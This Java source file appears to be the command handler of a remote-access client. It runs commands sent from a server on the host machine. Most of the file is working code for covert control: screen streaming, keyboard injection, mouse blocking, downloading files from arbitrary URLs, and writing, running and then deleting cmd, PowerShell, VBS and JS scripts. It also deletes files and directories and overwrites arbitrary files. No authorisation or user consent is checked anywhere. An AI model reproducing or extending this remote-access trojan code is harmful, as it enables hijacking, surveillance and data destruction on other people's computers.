package electron.networking;

import java.awt.Robot;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.json.simple.JSONObject;

import electron.console.logger;
import electron.functions.MessageBoxTweaks;
import electron.functions.Overlay;
import electron.networking.packets.ErrorPacket;
import electron.networking.packets.ExplorerPacketInput;
import electron.networking.packets.InputPacket;
import electron.networking.packets.ScriptFilePacket;
import electron.tools.Downloader;
import electron.tools.FileOptions;
import electron.tools.cmd;

public class CommandExecutor {
	private static boolean CmdMode = false;
	private static boolean screenEnabled = false;
	public static Robot r;

	/**
	 * @return boolean enabled/disabled
	 */
	public static boolean isScreenEnabled() {
		return screenEnabled;
	}

	public static void execute(InputPacket packet) {
		String command = packet.getCommand();
		if (command.equalsIgnoreCase("/tasklist")) {
			new ProcessSender(false).start();
			return;
		}
		if (command.equalsIgnoreCase("/tasklistfast")) {
			new ProcessSender(true).start();
			return;
		}
		if (command.contains("/edit=")) {
			String path = command.replaceFirst("/edit=", "");
			Runnable editRunnable = new Runnable() {
				@Override
				public void run() {
					Connection.send(new electron.networking.packets.EditPacket(path).get().toJSONString());
				}
			};
			new Thread(editRunnable).start();
			return;
		}
		logger.log("Executing: " + command);
		// toggle overlay
		if (command.equalsIgnoreCase("/overlay")) {
			Connection.sendMessage(Overlay.toggle());
			return;
		}
		if (command.equalsIgnoreCase("/echo")) {
			Connection.sendMessage("Lorem ipsum dolor... Joke!");
			return;
		}
		if (command.equalsIgnoreCase("/clientlog")) {
			logger.sendLog();
			return;
		}
		if (command.equalsIgnoreCase("/mode")) {
			CmdMode = !CmdMode;
			Connection.sendMessage("[Executor]: Set to: " + CmdMode);
			return;
		}
		if (command.equalsIgnoreCase("/screen")) {
			screenEnabled = !screenEnabled;
			Connection.sendMessage("[Screen]: Set to: " + screenEnabled);
			return;
		}
		if (command.equalsIgnoreCase("/screenv2")) {
			ScreenV2Sender.setEnabled(!ScreenV2Sender.isEnabled());
			Connection.sendMessage("[ScreenV2]: Set to: " + ScreenV2Sender.isEnabled());
			return;
		}
		if (command.equalsIgnoreCase("/stopapp")) {
			Connection.sendMessage("[Client]: Bye!");
			System.exit(0);
			return;
		}
		if (isMultiCommand("/setscreenquality", command)) {
			String[] args = getCommandArgs(command);
			if (!args[1].isEmpty()) {
				ScreenSender.setImageQuality(Double.parseDouble(args[1]));
				Connection.sendMessage("[Screen]: Set quality to " + args[1]);
			} else {
				Connection.sendMessage("[HELP]: Use /setscreenquality <0.1-1.0>");
			}
			return;
		}
		if (isMultiCommand("/setscreentimeout", command)) {
			String[] args = getCommandArgs(command);
			if (!args[1].isEmpty()) {
				ScreenSender.setTimeout(Integer.parseInt(args[1]));
				Connection.sendMessage("[Screen]: Set timeout to " + args[1]);
			} else {
				Connection.sendMessage("[HELP]: Use /setscreentimeout <timeout>");
			}
			return;
		}
		// Music player
		if (isMultiCommand("/player", command)) {
			String[] args = getCommandArgs(command);
			if (args[1].equalsIgnoreCase("stoplast")) {
				Connection.sendMessage(electron.functions.player.MusicManager.stopLast());
			} else if (args[1].equalsIgnoreCase("stopall")) {
				Connection.sendMessage(electron.functions.player.MusicManager.stopAll());
			} else if (args[1].equalsIgnoreCase("stop")) {
				Connection.sendMessage(electron.functions.player.MusicManager.stopName(args[2]));
			} else if (args[1].equalsIgnoreCase("list")) {
				Connection.sendMessage(electron.functions.player.MusicManager.showPlayers());
			} else {
				Connection.sendMessage(electron.functions.player.MusicManager.play(args[1]));
			}
			return;
		}
		// Block mouse
		if (command.equalsIgnoreCase("/fixmouse")) {
			Connection.sendMessage(electron.functions.MouseTweaks.toggleMouseFixer());
			return;
		}
		// Special for Viktor_LEV
		if (command.equalsIgnoreCase("/hacker?")) {
			ErrorPacket.sendError("Виктор в здании!");
			return;
		}
		// Messages manager
		if (isMultiCommand("/msg", command)) {
			String[] args = getCommandArgs(command);
			if (args[1].equalsIgnoreCase("show")) {
				Connection.sendMessage(MessageBoxTweaks.show());
			} else if (args[1].equalsIgnoreCase("close")) {
				Connection.sendMessage(MessageBoxTweaks.close());
			} else if (args[1].equalsIgnoreCase("closeall")) {
				Connection.sendMessage(MessageBoxTweaks.stopAll());
			} else {
				MessageBoxTweaks.callMessageBox(args[4].replaceAll("_", " "), args[3], args[1], args[2]);
			}
			return;
		}
		// Keyboard
		if (isMultiCommand("/press", command)) {
			String[] args = getCommandArgs(command);
			electron.functions.Keyboard.press(electron.functions.Keyboard.getKeyCode(args[1]));
			Connection.sendMessage("[KEYBOARD]: pressed key " + args[1]);
			return;
		}
		if (isMultiCommand("/release", command)) {
			String[] args = getCommandArgs(command);
			electron.functions.Keyboard.release(electron.functions.Keyboard.getKeyCode(args[1]));
			Connection.sendMessage("[KEYBOARD]: released key " + args[1]);
			return;
		}
		if (isMultiCommand("/presskey", command)) {
			String[] args = getCommandArgs(command);
			electron.functions.Keyboard.press(electron.functions.Keyboard.getKeyCode(args[1]));
			electron.functions.Keyboard.release(electron.functions.Keyboard.getKeyCode(args[1]));
			Connection.sendMessage("[KEYBOARD]: pressed and released key " + args[1]);
			return;
		}
		if (isMultiCommand("/presskeys", command)) {
			String[] args = getCommandArgs(command);
			String message = "[KEYBOARD]: pressed and released keys:";
			// Pressing
			for (String key : args) {
				electron.functions.Keyboard.press(electron.functions.Keyboard.getKeyCode(key));
				message = message + " " + key;
			}
			// Releasing
			for (String key : args) {
				electron.functions.Keyboard.release(electron.functions.Keyboard.getKeyCode(key));
			}
			Connection.sendMessage(message);
			return;
		}
		// Download file from Internet
		if (isMultiCommand("/download", command)) {
			String[] args = getCommandArgs(command);
			Runnable DownloadRunnable = new Runnable() {
				@Override
				public void run() {
					Connection.sendMessage("[Download]: Downloading " + args[2] + "...");
					Connection.sendMessageBox("Internal command", "[Download]: Downloading " + args[2] + "...");
					if (Downloader.download(args[1], args[2])) {
						Connection.sendMessage("[Download]: Downloaded file " + args[2] + ".");
						Connection.sendMessageBox("Internal command", "[Download]: Downloaded " + args[2] + ".");
					} else {
						Connection.sendMessage("[Download]: Error downloading " + args[2] + ".");
						ErrorPacket.sendError("[Download]: Error downloading " + args[2] + ".");
					}
				}
			};
			Thread DownloadThread = new Thread(DownloadRunnable);
			DownloadThread.start();
			return;
		}
		// Cmd command
		Runnable cmdRunnable = new Runnable() {
			@Override
			public void run() {
				cmd.execute(command, CmdMode);
			}
		};
		Thread cmdthread = new Thread(cmdRunnable);
		cmdthread.start();
	}

	private static boolean isMultiCommand(String commandname, String command) {
		if (!command.contains(" ")) {
			return false;
		}
		if (!command.contains(commandname)) {
			return false;
		}
		if (!command.contains(commandname + " ")) {
			return false;
		}
		return true;
	}

	private static String[] getCommandArgs(String in) {
		String[] spl = in.split(" ");
		return spl;
	}

	public static boolean isNumber(String s) {
		try {
			Integer.parseInt(s);
			return true;
		} catch (NumberFormatException e) {
			return false;
		}
	}

	public static void executeExplorerCommand(ExplorerPacketInput packet) {
		String command = packet.getCommand();
		if (command.startsWith("del ")) {
			command = command.replace("del ", "");
			logger.log("[electron.networking.CommandExecutor.executeExplorerCommand]: deleting " + command);
			File f = new File(command);
			if (f.isDirectory()) {
				deleteDirectory(f);
			} else {
				f.delete();
			}
			Connection.sendMessageBox("Explorer", "Deleted file: " + f.getName());
			return;
		}
		if (command.startsWith("create ")) {
			command = command.replace("create ", "");
			File f = new File(command);
			FileOptions.loadFileLite(f);
			logger.log("[electron.networking.CommandExecutor.executeExplorerCommand]: created " + command);
			Connection.sendMessageBox("Explorer", "Created file: " + f.getName());
			return;
		}
	}

	private static void deleteDirectory(File folder) {
		File[] files = folder.listFiles();
		if (files != null) {
			for (File file : files) {
				if (file.isDirectory()) {
					deleteDirectory(file);
				} else {
					file.delete();
				}
			}
		}
		folder.delete();
	}

	public static void executeScript(ScriptFilePacket packet) {
		// Executing script in other Thread
		Runnable scriptExecutor = new Runnable() {
			@Override
			public void run() {
				if (cmd.isWindows == false) {
					logger.error("[electron.networking.CommandExecutor.executeScript]: unsupported OS.");
					ErrorPacket.sendError("[electron.networking.CommandExecutor.executeScript]: unsupported OS.");
					return;
				}
				List<String> lines = new ArrayList<String>();
				for (String line : packet.getContent().split("\n")) {
					line.replaceAll("(newline)", "\n");
					lines.add(line);
				}
				String fname = String.valueOf(packet.hashCode());
				File file;
				switch (packet.getExecutor()) {
				case ScriptFilePacket.EXECUTOR_CMD:
					file = new File(fname + ".cmd");
					if (createScriptFile(file, lines)) {
						if (!cmd.execute(file.getPath(), false)) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error executing script. \n Script file: "
											+ file.getName());
							return;
						}
						if (!file.delete()) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error deleting script file. \n File name: "
											+ file.getName());
							return;
						}
						Connection.sendMessageBox("Scripts", "Executed CMD script.");
					}
					return;
				case ScriptFilePacket.EXECUTOR_BAT:
					file = new File(fname + ".bat");
					if (createScriptFile(file, lines)) {
						if (!cmd.execute(file.getPath(), false)) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error executing script. \n Script file: "
											+ file.getName());
							return;
						}
						if (!file.delete()) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error deleting script file. \n File name: "
											+ file.getName());
							return;
						}
						Connection.sendMessageBox("Scripts", "Executed BAT script.");
					}
					return;
				case ScriptFilePacket.EXECUTOR_POWERSHELL:
					file = new File(fname + ".ps1");
					if (createScriptFile(file, lines)) {
						String command = "powershell.exe /c " + "\"" + file.getAbsolutePath() + "\"";
						logger.log("[electron.networking.CommandExecutor.executeScript]: " + command);
						if (!cmd.execute(command, false)) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error executing script. \n Script file: "
											+ file.getName());
							return;
						}
						if (!file.delete()) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error deleting script file. \n File name: "
											+ file.getName());
							return;
						}
						Connection.sendMessageBox("Scripts", "Executed Powershell script.");
					}
					return;
				case ScriptFilePacket.EXECUTOR_VBS:
					file = new File(fname + ".vbs");
					if (createScriptFile(file, lines)) {
						String command = "cscript.exe " + "\"" + file.getAbsolutePath() + "\"";
						logger.log("[electron.networking.CommandExecutor.executeScript]: " + command);
						if (!cmd.execute(command, false)) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error executing script. \n Script file: "
											+ file.getName());
							return;
						}
						if (!file.delete()) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error deleting script file. \n File name: "
											+ file.getName());
							return;
						}
						Connection.sendMessageBox("Scripts", "Executed VBS script.");
					}
					return;
				case ScriptFilePacket.EXECUTOR_JS:
					file = new File(fname + ".js");
					if (createScriptFile(file, lines)) {
						String command = "cscript.exe " + "\"" + file.getAbsolutePath() + "\"";
						logger.log("[electron.networking.CommandExecutor.executeScript]: " + command);
						if (!cmd.execute(command, false)) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error executing script. \n Script file: "
											+ file.getName());
							return;
						}
						if (!file.delete()) {
							ErrorPacket.sendError(
									"[electron.networking.CommandExecutor.executeScript]: error deleting script file. \n File name: "
											+ file.getName());
							return;
						}
						Connection.sendMessageBox("Scripts", "Executed JS script.");
					}
					return;
				case ScriptFilePacket.EXECUTOR_POWERSHELL_CONSOLE:
					if (!cmd.execute("powershell.exe /c " + packet.getContent().replaceAll("(newline)", "\n"), true)) {
						ErrorPacket.sendError(
								"[electron.networking.CommandExecutor.executeScript]: error executing script.");
						return;
					}
					Connection.sendMessageBox("Scripts", "Executed Powershell Console command.");
					return;
				default:
					ErrorPacket.sendError(
							"[electron.networking.CommandExecutor.executeScript]: Incorrect script executor received");
					logger.error(
							"[electron.networking.CommandExecutor.executeScript]: incorrect script executor received");
				}
			}
		};
		// Starting thread
		new Thread(scriptExecutor).start();
	}

	private static boolean createScriptFile(File file, List<String> lines) {
		FileOptions.loadFileLite(file);
		if (!file.exists()) {
			logger.error("[electron.networking.CommandExecutor.createScriptFile]: error creating script file.");
			ErrorPacket
					.sendError("[electron.networking.CommandExecutor.createScriptFile]: error creating script file.");
			return false;
		}
		if (!FileOptions.writeLines(lines, file)) {
			logger.error("[electron.networking.CommandExecutor.createScriptFile]: error writing data to script file");
			ErrorPacket.sendError(
					"[electron.networking.CommandExecutor.createScriptFile]: error writing data to script file");
			file.delete();
			return false;
		}
		return true;
	}

	public static void executeEdit(JSONObject input) {
		logger.log(String.valueOf(input.get("filepath")));
		File toChange = new File(String.valueOf(input.get("filepath")));
		List<String> lines = new ArrayList<String>();
		for (String line : String.valueOf(input.get("content")).split("\n")) {
			line.replaceAll("(newline)", "\n");
			lines.add(line);
		}
		boolean result = FileOptions.writeLines(lines, toChange);
		if (!result) {
			ErrorPacket.sendError("[electron.networking.CommandExecutor.executeEdit]: error writing to file.");
		} else {
			logger.log("[electron.networking.CommandExecutor.executeEdit]: updated file: " + toChange.getName());
			Connection.sendMessageBox("Editor", "Updated file: " + toChange.getName());
		}
	}
}
